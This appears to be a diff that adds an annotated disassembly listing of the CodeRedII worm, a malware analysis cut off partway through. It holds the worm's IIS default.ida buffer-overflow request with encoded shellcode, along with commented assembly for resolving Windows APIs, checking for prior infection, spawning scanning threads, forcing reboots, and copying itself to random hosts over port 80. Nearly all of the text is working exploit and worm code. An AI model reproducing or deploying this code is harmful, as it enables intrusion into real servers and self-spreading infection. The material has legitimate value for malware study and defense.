@@ -1,0 +1,1095 @@
+seg000:00000000			  
+seg000:00000000			  seg000	  segment byte public 'CODE' use32
+seg000:00000000					  assume cs:seg000
+seg000:00000000					  assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
+seg000:00000000	47 45 54 20 2F 64+aGetDefault_ida db 'GET /default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
+seg000:00000000	65 66 61 75 6C 74+					  ; DATA XREF: seg000:000001C1r
+seg000:00000000	2E 69 64 61 3F 58+		  db 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
+seg000:00000000	58 58 58 58 58 58+		  db 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
+seg000:00000000	58 58 58 58 58 58+		  db 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
+seg000:00000000	58 58 58 58 58 58+		  db 'X%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u685'
+seg000:00000000	58 58 58 58 58 58+		  db '8%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53f'
+seg000:00000000	58 58 58 58 58 58+		  db 'f%u0078%u0000%u00=a  HTTP/1.0',0Dh,0Ah
+seg000:00000000	58 58 58 58 58 58+		  db 'Content-type: text/xml',0Ah
+seg000:00000000	58 58 58 58 58 58+		  db 'Content-length: 3379 ',0Dh,0Ah
+seg000:00000000	58 58 58 58 58 58+		  db 0Dh,0Ah
+seg000:000001B7			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000001B7			  
+seg000:000001B7			  ENTER:				  ; CODE XREF: sub_1C4+EDj
+seg000:000001B7	C8 C8 01 00			  enter	  1C8h,	0	  ; create a stack frame of 1c8	bytes
+seg000:000001BB	60				  pusha			  ; push all
+seg000:000001BC	E8 03 00 00 00			  call	  sub_1C4	  ; Call Procedure
+seg000:000001C1	CC				  int	  3		  ; Trap to Debugger
+seg000:000001C2			  
+seg000:000001C2			  TIGHTLOOP1:				  ; CODE XREF: seg000:000001C2j
+seg000:000001C2	EB FE				  jmp	  short	TIGHTLOOP1 ; tight loop
+seg000:000001C4			  
+seg000:000001C4			  ; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U	B R O U	T I N E	ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
+seg000:000001C4			  
+seg000:000001C4			  ; Attributes:	bp-based frame
+seg000:000001C4			  
+seg000:000001C4			  sub_1C4	  proc near		  ; CODE XREF: seg000:000001BCp
+seg000:000001C4			  
+seg000:000001C4			  IS_INFECTED	  = byte ptr -1C8h
+seg000:000001C4			  SYSTEMTIME_Year = word ptr -1C4h
+seg000:000001C4			  SYSTEMTIME_Month= word ptr -1C2h
+seg000:000001C4			  SYSTEMTIME_DayofWeek=	word ptr -1C0h
+seg000:000001C4			  SYSTEMTIME_Day  = word ptr -1BEh
+seg000:000001C4			  SYSTEMTIME_Hour = word ptr -1BCh
+seg000:000001C4			  SYSTEMTIME_Minute= word ptr -1BAh
+seg000:000001C4			  SYSTEMTIME_Second= word ptr -1B8h
+seg000:000001C4			  SYSTEMTIME_Miliseconds= word ptr -1B6h
+seg000:000001C4			  H_FILE	  = dword ptr -1B4h	  ; used for d:\explorer.exe
+seg000:000001C4			  var_1B0	  = dword ptr -1B0h
+seg000:000001C4			  IS_CHINESE	  = dword ptr -1ACh
+seg000:000001C4			  LOCAL_IP	  = dword ptr -1A8h
+seg000:000001C4			  HOST_BUF	  = byte ptr -1A4h
+seg000:000001C4			  fd_set_count	  = dword ptr -0A0h
+seg000:000001C4			  fd_set_SOCKETarray= dword ptr	-9Ch
+seg000:000001C4			  timeval_sec	  = dword ptr -98h
+seg000:000001C4			  timeval_usec	  = dword ptr -94h
+seg000:000001C4			  SOCKADDR_family = word ptr -90h
+seg000:000001C4			  SOCKADDR_port	  = word ptr -8Eh
+seg000:000001C4			  SOCKADDR_addr	  = dword ptr -8Ch
+seg000:000001C4			  SOCKADDR_zero1  = dword ptr -88h
+seg000:000001C4			  SOCKADDR_zero2  = dword ptr -84h
+seg000:000001C4			  SOCKETHANDLE	  = dword ptr -80h
+seg000:000001C4			  IP_STORAGE	  = dword ptr -7Ch
+seg000:000001C4			  ThreadID	  = dword ptr -78h
+seg000:000001C4			  ExitWindowsEx	  = dword ptr -74h
+seg000:000001C4			  HMODULE_USER32  = dword ptr -70h
+seg000:000001C4			  WSAGetLastError = dword ptr -6Ch
+seg000:000001C4			  gethostbyname	  = dword ptr -68h
+seg000:000001C4			  gethostname	  = dword ptr -64h
+seg000:000001C4			  select	  = dword ptr -60h
+seg000:000001C4			  ioctlsocket	  = dword ptr -5Ch
+seg000:000001C4			  recv		  = dword ptr -58h
+seg000:000001C4			  send		  = dword ptr -54h
+seg000:000001C4			  connect	  = dword ptr -50h
+seg000:000001C4			  closesocket	  = dword ptr -4Ch
+seg000:000001C4			  socket	  = dword ptr -48h
+seg000:000001C4			  HMODULE_WS2_32  = dword ptr -44h
+seg000:000001C4			  GetSystemTime	  = dword ptr -40h
+seg000:000001C4			  _lclose	  = dword ptr -3Ch
+seg000:000001C4			  _lwrite	  = dword ptr -38h
+seg000:000001C4			  _lcreat	  = dword ptr -34h
+seg000:000001C4			  CloseHandle	  = dword ptr -30h
+seg000:000001C4			  GlobalAddAtomA  = dword ptr -2Ch
+seg000:000001C4			  GlobalFindAtomA = dword ptr -28h
+seg000:000001C4			  CopyFileA	  = dword ptr -24h
+seg000:000001C4			  GetSystemDirectoryA= dword ptr -20h
+seg000:000001C4			  GetSystemDefaultLangID= dword	ptr -1Ch
+seg000:000001C4			  Sleep		  = dword ptr -18h
+seg000:000001C4			  GetTickCount	  = dword ptr -14h
+seg000:000001C4			  CreateThread	  = dword ptr -10h
+seg000:000001C4			  LoadLibraryA	  = dword ptr -0Ch
+seg000:000001C4			  GetProcAddress  = dword ptr -8
+seg000:000001C4			  HMODULE_KERNEL32= dword ptr -4
+seg000:000001C4			  arg_4		  = dword ptr  8
+seg000:000001C4			  
+seg000:000001C4	64 67 FF 36 00 00		  push	  dword	ptr fs:0
+seg000:000001CA	64 67 89 26 00 00		  mov	  fs:0,	esp
+seg000:000001D0	E8 DF 02 00 00			  call	  SETUP_JUMPTABLE ; Call Procedure
+seg000:000001D5	68 04 01 00 00			  push	  104h
+seg000:000001DA	8D 85 5C FE FF FF		  lea	  eax, [ebp+HOST_BUF] ;	Load Effective Address
+seg000:000001E0	50				  push	  eax
+seg000:000001E1	FF 55 9C			  call	  [ebp+gethostname] ; get the localhostname
+seg000:000001E4	8D 85 5C FE FF FF		  lea	  eax, [ebp+HOST_BUF] ;	Load Effective Address
+seg000:000001EA	50				  push	  eax
+seg000:000001EB	FF 55 98			  call	  [ebp+gethostbyname] ;	get the	local ip
+seg000:000001EE	8B 40 10			  mov	  eax, [eax+10h]  ; set	eax to the local ip
+seg000:000001F1	8B 08				  mov	  ecx, [eax]
+seg000:000001F3	89 8D 58 FE FF FF		  mov	  [ebp+LOCAL_IP], ecx
+seg000:000001F9	FF 55 E4			  call	  [ebp+GetSystemDefaultLangID] ; Indirect Call Near Procedure
+seg000:000001FC	3D 04 04 00 00			  cmp	  eax, 404h	  ; check syslang vs Chineese Tiawan
+seg000:00000201	0F 94 C1			  setz	  cl		  ; set	if it is
+seg000:00000204	3D 04 08 00 00			  cmp	  eax, 804h	  ; check syslang vs Chineese PRC
+seg000:00000209	0F 94 C5			  setz	  ch		  ; set	if it is
+seg000:0000020C	0A CD				  or	  cl, ch	  ; if either of them are set, set this
+seg000:0000020E	0F B6 C9			  movzx	  ecx, cl	  ; store this in ecx
+seg000:00000211	89 8D 54 FE FF FF		  mov	  [ebp+IS_CHINESE], ecx	; set the IS_CHINEESE
+seg000:00000217	8B 75 08			  mov	  esi, [ebp+arg_4]
+seg000:0000021A	81 7E 30 9A 02 00+		  cmp	  dword	ptr [esi+30h], 29Ah ; check if arg_4+30h is 29a
+seg000:00000221	0F 84 C4 00 00 00		  jz	  DO_SOCKET	  ; if it is, go here
+seg000:00000227	C7 46 30 9A 02 00+		  mov	  dword	ptr [esi+30h], 29Ah ; set arg_4+30h to 29a
+seg000:0000022E	E8 0A 00 00 00			  call	  CheckCodeRedATOM ; Call Procedure
+seg000:0000022E			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000233	43 6F 64 65 52 65+aCoderedii	  db 'CodeRedII',0
+seg000:0000023D			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:0000023D			  
+seg000:0000023D			  CheckCodeRedATOM:			  ; CODE XREF: sub_1C4+6Ap
+seg000:0000023D	8B 1C 24			  mov	  ebx, [esp+10h+CreateThread]
+seg000:00000240	FF 55 D8			  call	  [ebp+GlobalFindAtomA]	; find a global	attom called CodeRedII
+seg000:00000243	66 0B C0			  or	  ax, ax	  ; see	if it's set
+seg000:00000246	0F 95 85 38 FE FF+		  setnz	  [ebp+IS_INFECTED] ; Set Byte if Not Zero (ZF=0)
+seg000:0000024D	C7 85 50 FE FF FF+		  mov	  [ebp+var_1B0], 1
+seg000:00000257	6A 00				  push	  0
+seg000:00000259	8D 85 50 FE FF FF		  lea	  eax, [ebp+var_1B0] ; Load Effective Address
+seg000:0000025F	50				  push	  eax
+seg000:00000260	8D 85 38 FE FF FF		  lea	  eax, [ebp+IS_INFECTED] ; Load	Effective Address
+seg000:00000266	50				  push	  eax
+seg000:00000267	8B 45 08			  mov	  eax, [ebp+arg_4]
+seg000:0000026A	FF 70 08			  push	  dword	ptr [eax+8]
+seg000:0000026D	FF 90 84 00 00 00		  call	  dword	ptr [eax+84h] ;	Indirect Call Near Procedure
+seg000:00000273	80 BD 38 FE FF FF+		  cmp	  [ebp+IS_INFECTED], 1 ; Compare Two Operands
+seg000:0000027A	74 68				  jz	  short	SLEEP_FOREVER ;	Jump if	Zero (ZF=1)
+seg000:0000027C	53				  push	  ebx
+seg000:0000027D	FF 55 D4			  call	  [ebp+GlobalAddAtomA] ; Set GlobalAtom	For CODEREDII
+seg000:00000280	FF 55 EC			  call	  [ebp+GetTickCount] ; Indirect	Call Near Procedure
+seg000:00000283	01 45 84			  add	  [ebp+IP_STORAGE], eax	; set the tickcount to the local ip storage
+seg000:00000286	69 BD 54 FE FF FF+		  imul	  edi, [ebp+IS_CHINESE], 12Ch ;	Signed Multiply
+seg000:00000290	81 C7 2C 01 00 00		  add	  edi, 12Ch	  ; Add
+seg000:00000296			  
+seg000:00000296			  CreateThreadTop:			  ; CODE XREF: sub_1C4+FEj
+seg000:00000296	E8 D2 04 00 00			  call	  GEN_OCTET	  ; Call Procedure
+seg000:0000029B	F7 D0				  not	  eax		  ; One's Complement Negation
+seg000:0000029D	0F AF C7			  imul	  eax, edi	  ; Signed Multiply
+seg000:000002A0	89 46 34			  mov	  [esi+34h], eax
+seg000:000002A3	8D 45 88			  lea	  eax, [ebp+ThreadID] ;	Load Effective Address
+seg000:000002A6	50				  push	  eax		  ; *ThreadID
+seg000:000002A7	6A 00				  push	  0		  ; no creation	flags
+seg000:000002A9	FF 75 08			  push	  [ebp+arg_4]	  ; lpParameter
+seg000:000002AC	E8 05 00 00 00			  call	  CreateThreadjumpover ; Call Procedure
+seg000:000002B1	E9 01 FF FF FF			  jmp	  ENTER		  ; eip	of jump	enter
+seg000:000002B6			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000002B6			  
+seg000:000002B6			  CreateThreadjumpover:			  ; CODE XREF: sub_1C4+E8p
+seg000:000002B6	6A 00				  push	  0
+seg000:000002B8	6A 00				  push	  0		  ; Security Descriptor
+seg000:000002BA	FF 55 F0			  call	  [ebp+CreateThread] ; create a	thread
+seg000:000002BD	50				  push	  eax
+seg000:000002BE	FF 55 D0			  call	  [ebp+CloseHandle] ; disassociate the thread handle
+seg000:000002C1	4F				  dec	  edi		  ; Decrement by 1
+seg000:000002C2	75 D2				  jnz	  short	CreateThreadTop	; loop if not 0
+seg000:000002C4	E8 3B 05 00 00			  call	  DO_OWN	  ; Call Procedure
+seg000:000002C9	69 BD 54 FE FF FF+		  imul	  edi, [ebp-1ACh], 5265C00h ; after 1+x	number of daya,	traverse to reboot.
+seg000:000002D3	81 C7 00 5C 26 05		  add	  edi, 5265C00h	  ; Add
+seg000:000002D9	57				  push	  edi
+seg000:000002DA	FF 55 E8			  call	  dword	ptr [ebp-18h] ;	sleep
+seg000:000002DD			  
+seg000:000002DD			  REBOOT_WINDOWS:			  ; CODE XREF: sub_1C4+148j
+seg000:000002DD								  ; sub_1C4+154j
+seg000:000002DD	6A 00				  push	  0
+seg000:000002DF	6A 16				  push	  16h		  ; push EWX_REBOOT | EWX_FORCE	| EWX_FORCEIFHUNG
+seg000:000002E1	FF 55 8C			  call	  [ebp+ExitWindowsEx] ;	Indirect Call Near Procedure
+seg000:000002E4			  
+seg000:000002E4			  SLEEP_FOREVER:			  ; CODE XREF: sub_1C4+B6j
+seg000:000002E4								  ; sub_1C4+125j
+seg000:000002E4	6A FF				  push	  0FFFFFFFFh
+seg000:000002E6	FF 55 E8			  call	  [ebp+Sleep]	  ; Indirect Call Near Procedure
+seg000:000002E9	EB F9				  jmp	  short	SLEEP_FOREVER ;	Jump
+seg000:000002EB			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000002EB			  
+seg000:000002EB			  DO_SOCKET:				  ; CODE XREF: sub_1C4+5Dj
+seg000:000002EB	8B 46 34			  mov	  eax, [esi+34h]
+seg000:000002EE	29 45 84			  sub	  [ebp+IP_STORAGE], eax	; set ip storage from held var
+seg000:000002F1			  
+seg000:000002F1			  SOCKET_TOP:				  ; CODE XREF: sub_1C4+241j
+seg000:000002F1	6A 64				  push	  64h ;	'd'
+seg000:000002F3	FF 55 E8			  call	  [ebp+Sleep]	  ; sleep for 64h miliseconds
+seg000:000002F6	8D 85 3C FE FF FF		  lea	  eax, [ebp+SYSTEMTIME_Year] ; Load Effective Address
+seg000:000002FC	50				  push	  eax
+seg000:000002FD	FF 55 C0			  call	  [ebp+GetSystemTime] ;	Indirect Call Near Procedure
+seg000:00000300	0F B7 85 3C FE FF+		  movzx	  eax, [ebp+SYSTEMTIME_Year] ; Move with Zero-Extend
+seg000:00000307	3D D2 07 00 00			  cmp	  eax, 7D2h	  ; check if it's 20002, guess we are planning ahead
+seg000:0000030C	73 CF				  jnb	  short	REBOOT_WINDOWS ; Jump if Not Below (CF=0)
+seg000:0000030E	0F B7 85 3E FE FF+		  movzx	  eax, [ebp+SYSTEMTIME_Month] ;	Move with Zero-Extend
+seg000:00000315	83 F8 0A			  cmp	  eax, 0Ah	  ; check if month is less than	10
+seg000:00000318	73 C3				  jnb	  short	REBOOT_WINDOWS ; Jump if Not Below (CF=0)
+seg000:0000031A	66 C7 85 70 FF FF+		  mov	  [ebp+SOCKADDR_family], 2
+seg000:00000323	66 C7 85 72 FF FF+		  mov	  [ebp+SOCKADDR_port], 5000h
+seg000:0000032C	E8 64 04 00 00			  call	  GET_IP	  ; load 4th octet (this is in reverse ordwer due to byte ordering)
+seg000:00000331	89 9D 74 FF FF FF		  mov	  [ebp+SOCKADDR_addr], ebx
+seg000:00000337			  
+seg000:00000337			  SET_SOCKET:				  ; CODE XREF: sub_1C4+17Fj
+seg000:00000337	6A 00				  push	  0
+seg000:00000339	6A 01				  push	  1
+seg000:0000033B	6A 02				  push	  2
+seg000:0000033D	FF 55 B8			  call	  [ebp+socket]	  ; Indirect Call Near Procedure
+seg000:00000340	83 F8 FF			  cmp	  eax, 0FFFFFFFFh ; check if it's an error
+seg000:00000343	74 F2				  jz	  short	SET_SOCKET ; Jump if Zero (ZF=1)
+seg000:00000345	89 45 80			  mov	  [ebp+SOCKETHANDLE], eax
+seg000:00000348	6A 01				  push	  1
+seg000:0000034A	54				  push	  esp
+seg000:0000034B	68 7E 66 04 80			  push	  8004667Eh
+seg000:00000350	FF 75 80			  push	  [ebp+SOCKETHANDLE]
+seg000:00000353	FF 55 A4			  call	  [ebp+ioctlsocket] ; set nonblocking
+seg000:00000356	59				  pop	  ecx
+seg000:00000357	6A 10				  push	  10h
+seg000:00000359	8D 85 70 FF FF FF		  lea	  eax, [ebp+SOCKADDR_family] ; Load Effective Address
+seg000:0000035F	50				  push	  eax
+seg000:00000360	FF 75 80			  push	  [ebp+SOCKETHANDLE]
+seg000:00000363	FF 55 B0			  call	  [ebp+connect]	  ; Indirect Call Near Procedure
+seg000:00000366	BB 01 00 00 00			  mov	  ebx, 1	  ; set	ebx to 1
+seg000:0000036B	0B C0				  or	  eax, eax	  ; check if connect returned anything
+seg000:0000036D	74 4B				  jz	  short	SET_BLOCKING ; if it did, go here
+seg000:0000036F	33 DB				  xor	  ebx, ebx	  ; clear ebx
+seg000:00000371	FF 55 94			  call	  [ebp+WSAGetLastError]	; Indirect Call	Near Procedure
+seg000:00000374	3D 33 27 00 00			  cmp	  eax, 2733h	  ; check return val of	GetLast	Error
+seg000:00000379	75 3F				  jnz	  short	SET_BLOCKING ; Jump if Not Zero	(ZF=0)
+seg000:0000037B	C7 85 68 FF FF FF+		  mov	  [ebp+timeval_sec], 0Ah
+seg000:00000385	C7 85 6C FF FF FF+		  mov	  [ebp+timeval_usec], 0
+seg000:0000038F	C7 85 60 FF FF FF+		  mov	  [ebp+fd_set_count], 1
+seg000:00000399	8B 45 80			  mov	  eax, [ebp+SOCKETHANDLE]
+seg000:0000039C	89 85 64 FF FF FF		  mov	  [ebp+fd_set_SOCKETarray], eax
+seg000:000003A2	8D 85 68 FF FF FF		  lea	  eax, [ebp+timeval_sec] ; Load	Effective Address
+seg000:000003A8	50				  push	  eax
+seg000:000003A9	6A 00				  push	  0		  ; exceptfs
+seg000:000003AB	8D 85 60 FF FF FF		  lea	  eax, [ebp+fd_set_count] ; Load Effective Address
+seg000:000003B1	50				  push	  eax		  ; writefs
+seg000:000003B2	6A 00				  push	  0		  ; readfs
+seg000:000003B4	6A 01				  push	  1		  ; ntfds, leftover for	berkeley compat
+seg000:000003B6	FF 55 A0			  call	  [ebp+select]	  ; Indirect Call Near Procedure
+seg000:000003B9	93				  xchg	  eax, ebx	  ; store the number of	sockets	writeable in ebx
+seg000:000003BA			  
+seg000:000003BA			  SET_BLOCKING:				  ; CODE XREF: sub_1C4+1A9j
+seg000:000003BA								  ; sub_1C4+1B5j
+seg000:000003BA	6A 00				  push	  0
+seg000:000003BC	54				  push	  esp		  ; set	it to 0
+seg000:000003BD	68 7E 66 04 80			  push	  8004667Eh
+seg000:000003C2	FF 75 80			  push	  [ebp+SOCKETHANDLE]
+seg000:000003C5	FF 55 A4			  call	  [ebp+ioctlsocket] ; Indirect Call Near Procedure
+seg000:000003C8	59				  pop	  ecx
+seg000:000003C9	83 FB 01			  cmp	  ebx, 1	  ; see	if socket is ready to be written
+seg000:000003CC	75 31				  jnz	  short	SOCKET_CLOSE ; Jump if Not Zero	(ZF=0)
+seg000:000003CE	E8 00 00 00 00			  call	  $+5		  ; Call Procedure
+seg000:000003D3	58				  pop	  eax		  ; get	current	eip in eax
+seg000:000003D4	2D D3 03 00 00			  sub	  eax, 3D3h	  ; put	eax to the beginning
+seg000:000003D9	6A 00				  push	  0		  ; no flags
+seg000:000003DB	68 EA 0E 00 00			  push	  0EEAh		  ; put	total length of	code
+seg000:000003E0	50				  push	  eax		  ; put	address	of start of code
+seg000:000003E1	FF 75 80			  push	  [ebp+SOCKETHANDLE] ; push sockhandle
+seg000:000003E4	FF 55 AC			  call	  [ebp+send]	  ; send the code
+seg000:000003E7	3D EA 0E 00 00			  cmp	  eax, 0EEAh	  ; check that it all sent
+seg000:000003EC	75 11				  jnz	  short	SOCKET_CLOSE ; if it didn't, close the socket
+seg000:000003EE	6A 00				  push	  0		  ; no flags
+seg000:000003F0	6A 01				  push	  1		  ; length of recv
+seg000:000003F2	8D 85 5C FE FF FF		  lea	  eax, [ebp+HOST_BUF] ;	put it in the hostbuf
+seg000:000003F8	50				  push	  eax
+seg000:000003F9	FF 75 80			  push	  [ebp+SOCKETHANDLE] ; set the socket
+seg000:000003FC	FF 55 A8			  call	  [ebp+recv]	  ; recv()
+seg000:000003FF			  
+seg000:000003FF			  SOCKET_CLOSE:				  ; CODE XREF: sub_1C4+208j
+seg000:000003FF								  ; sub_1C4+228j
+seg000:000003FF	FF 75 80			  push	  [ebp+SOCKETHANDLE]
+seg000:00000402	FF 55 B4			  call	  [ebp+closesocket] ; Indirect Call Near Procedure
+seg000:00000405	E9 E7 FE FF FF			  jmp	  SOCKET_TOP	  ; Jump
+seg000:0000040A			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:0000040A			  
+seg000:0000040A			  DO_RVA:				  ; CODE XREF: sub_1C4+2F0p
+seg000:0000040A	BB 00 00 DF 77			  mov	  ebx, 77DF0000h
+seg000:0000040F			  
+seg000:0000040F			  TopOfRva:				  ; CODE XREF: sub_1C4+270j
+seg000:0000040F	81 C3 00 00 01 00		  add	  ebx, 10000h	  ; Add
+seg000:00000415	81 FB 00 00 00 78		  cmp	  ebx, 78000000h  ; Compare Two	Operands
+seg000:0000041B	75 05				  jnz	  short	NOTx78	  ; if it isn't go here
+seg000:0000041D	BB 00 00 F0 BF			  mov	  ebx, 0BFF00000h
+seg000:00000422			  
+seg000:00000422			  NOTx78:				  ; CODE XREF: sub_1C4+257j
+seg000:00000422	60				  pusha			  ; Push all General Registers
+seg000:00000423	E8 0E 00 00 00			  call	  loc_436	  ; Call Procedure
+seg000:00000428	8B 64 24 08			  mov	  esp, [esp+0A0h+timeval_sec]
+seg000:0000042C			  
+seg000:0000042C			  loc_42C:				  ; CODE XREF: sub_1C4+283j
+seg000:0000042C								  ; sub_1C4+28Fj ...
+seg000:0000042C	64 67 8F 06 00 00		  pop	  dword	ptr fs:0
+seg000:00000432	58				  pop	  eax
+seg000:00000433	61				  popa			  ; Pop	all General Registers
+seg000:00000434	EB D9				  jmp	  short	TopOfRva  ; Jump
+seg000:00000436			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000436			  
+seg000:00000436			  loc_436:				  ; CODE XREF: sub_1C4+25Fp
+seg000:00000436	64 67 FF 36 00 00		  push	  dword	ptr fs:0
+seg000:0000043C	64 67 89 26 00 00		  mov	  fs:0,	esp
+seg000:00000442	66 81 3B 4D 5A			  cmp	  word ptr [ebx], 5A4Dh	; Compare Two Operands
+seg000:00000447	75 E3				  jnz	  short	loc_42C	  ; Jump if Not	Zero (ZF=0)
+seg000:00000449	8B 4B 3C			  mov	  ecx, [ebx+3Ch]
+seg000:0000044C	81 3C 0B 50 45 00+		  cmp	  dword	ptr [ebx+ecx], 4550h ; Compare Two Operands
+seg000:00000453	75 D7				  jnz	  short	loc_42C	  ; Jump if Not	Zero (ZF=0)
+seg000:00000455	8B 54 0B 78			  mov	  edx, [ebx+ecx+78h]
+seg000:00000459	03 D3				  add	  edx, ebx	  ; Add
+seg000:0000045B	8B 42 0C			  mov	  eax, [edx+0Ch]
+seg000:0000045E	81 3C 03 4B 45 52+		  cmp	  dword	ptr [ebx+eax], 4E52454Bh ; Compare Two Operands
+seg000:00000465	75 C5				  jnz	  short	loc_42C	  ; Jump if Not	Zero (ZF=0)
+seg000:00000467	81 7C 03 04 45 4C+		  cmp	  dword	ptr [ebx+eax+4], 32334C45h ; Compare Two Operands
+seg000:0000046F	75 BB				  jnz	  short	loc_42C	  ; Jump if Not	Zero (ZF=0)
+seg000:00000471	33 C9				  xor	  ecx, ecx	  ; Logical Exclusive OR
+seg000:00000473	49				  dec	  ecx		  ; Decrement by 1
+seg000:00000474	8B 72 20			  mov	  esi, [edx+20h]
+seg000:00000477	03 F3				  add	  esi, ebx	  ; Add
+seg000:00000479	FC				  cld			  ; Clear Direction Flag
+seg000:0000047A			  
+seg000:0000047A			  loc_47A:				  ; CODE XREF: sub_1C4+2BFj
+seg000:0000047A								  ; sub_1C4+2C9j
+seg000:0000047A	41				  inc	  ecx		  ; Increment by 1
+seg000:0000047B	AD				  lodsd			  ; Load String
+seg000:0000047C	81 3C 03 47 65 74+		  cmp	  dword	ptr [ebx+eax], 50746547h ; Compare Two Operands
+seg000:00000483	75 F5				  jnz	  short	loc_47A	  ; Jump if Not	Zero (ZF=0)
+seg000:00000485	81 7C 03 04 72 6F+		  cmp	  dword	ptr [ebx+eax+4], 41636F72h ; Compare Two Operands
+seg000:0000048D	75 EB				  jnz	  short	loc_47A	  ; Jump if Not	Zero (ZF=0)
+seg000:0000048F	03 4A 10			  add	  ecx, [edx+10h]  ; Add
+seg000:00000492	49				  dec	  ecx		  ; Decrement by 1
+seg000:00000493	D1 E1				  shl	  ecx, 1	  ; Shift Logical Left
+seg000:00000495	03 4A 24			  add	  ecx, [edx+24h]  ; Add
+seg000:00000498	0F B7 0C 0B			  movzx	  ecx, word ptr	[ebx+ecx] ; Move with Zero-Extend
+seg000:0000049C	C1 E1 02			  shl	  ecx, 2	  ; Shift Logical Left
+seg000:0000049F	03 4A 1C			  add	  ecx, [edx+1Ch]  ; Add
+seg000:000004A2	8B 04 0B			  mov	  eax, [ebx+ecx]
+seg000:000004A5	03 C3				  add	  eax, ebx	  ; Add
+seg000:000004A7	89 44 24 24			  mov	  [esp+0A4h+SOCKETHANDLE], eax
+seg000:000004AB	64 67 8F 06 00 00		  pop	  dword	ptr fs:0
+seg000:000004B1	58				  pop	  eax
+seg000:000004B2	61				  popa			  ; Pop	all General Registers
+seg000:000004B3	C3				  retn			  ; Return Near	from Procedure
+seg000:000004B4			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000004B4			  
+seg000:000004B4			  SETUP_JUMPTABLE:			  ; CODE XREF: sub_1C4+Cp
+seg000:000004B4	E8 51 FF FF FF			  call	  DO_RVA	  ; Call Procedure
+seg000:000004B9	89 5D FC			  mov	  [ebp+HMODULE_KERNEL32], ebx
+seg000:000004BC	89 45 F8			  mov	  [ebp+GetProcAddress],	eax
+seg000:000004BF	E8 0D 00 00 00			  call	  SETUP_LoadlibraryA ; Call Procedure
+seg000:000004BF			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000004C4	4C 6F 61 64 4C 69+aLoadlibrarya	  db 'LoadLibraryA',0
+seg000:000004D1			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000004D1			  
+seg000:000004D1			  SETUP_LoadlibraryA:			  ; CODE XREF: sub_1C4+2FBp
+seg000:000004D1	FF 75 FC			  push	  [ebp+HMODULE_KERNEL32]
+seg000:000004D4	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:000004D7	89 45 F4			  mov	  [ebp+LoadLibraryA], eax
+seg000:000004DA	E8 0D 00 00 00			  call	  SETUP_Createthread ; Call Procedure
